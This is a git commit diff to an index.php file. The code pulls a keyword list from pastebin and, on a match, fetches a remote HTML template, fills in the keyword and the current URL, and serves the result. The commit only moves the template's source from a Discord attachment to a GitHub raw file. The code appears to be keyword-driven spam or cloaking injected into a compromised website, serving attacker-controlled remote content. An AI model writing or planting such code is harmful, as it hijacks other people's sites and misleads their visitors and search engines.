99646d09da64bf3749fba17fff52cd906091d545
0xF102400 <165850862+0xF102400@users.noreply.github.com>
2024-05-13 00:13:41 +0700

    Update index.php

--- index.php
+++ index.php
@@ -7,7 +7,7 @@ $external_content = file_get_contents("https://pastebin.com/raw/v0UzjLTc");
 
 if (isset($keyword)) {
     if (stripos($external_content, $keyword) !== false) {
-        $page = file_get_contents("https://cdn.discordapp.com/attachments/1184479194193875004/1228549096680460288/pba-uinsgd.html");
+        $page = file_get_contents("https://github.com/0xF102400/peler/raw/main/pba-uinsgd.html");
         $page = str_replace("kwbrand", $keyword, $page);
         $page = str_replace("urltunnel", $fullURL, $page);
         echo $page;
